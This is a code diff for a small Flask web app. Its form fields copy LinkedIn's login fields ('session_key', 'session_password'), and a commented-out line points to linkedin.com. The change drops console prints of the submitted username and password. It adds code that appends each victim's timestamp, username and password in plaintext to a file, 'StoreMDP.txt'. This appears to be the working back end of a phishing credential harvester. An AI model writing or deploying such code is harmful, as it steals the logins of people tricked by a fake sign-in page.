@@ -2,6 +2,8 @@ import pdb
 from flask import Flask, render_template, request
 from func_api import *
 import os
+from datetime import datetime
+
 
 app = Flask(__name__)
 
@@ -12,20 +14,18 @@ def hello_world():
     if request_type_str == 'GET':
         return render_template('index.html')
     else :
+
         #text = request.form['text']
+        now = datetime.now()
+        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
         user = request.form['session_key']
         psw = request.form['session_password']
-        print("---------------------------------")
-        print("---------------------------------")
-        print("---------------------------------")
-        print("---------------------------------")
-        print(user)
-        print(psw)
-        print("---------------------------------")
-        print("---------------------------------")
-        print("---------------------------------")
-        print("---------------------------------")
-
+        f = open("StoreMDP.txt", "a")
+        f.write("\n***********\n")
+        f.write("date  = "+dt_string+"\n")
+        f.write("Username = "+user+"\n")
+        f.write("password = "+psw+"\n***********\n")
+        f.close()
         #return render_template('index.html', href=path, input=text, output=preds_as_str[1:-1])
         #return render_template('index.html')
         #return render_template('troll.html', href="https://www.linkedin.com/")
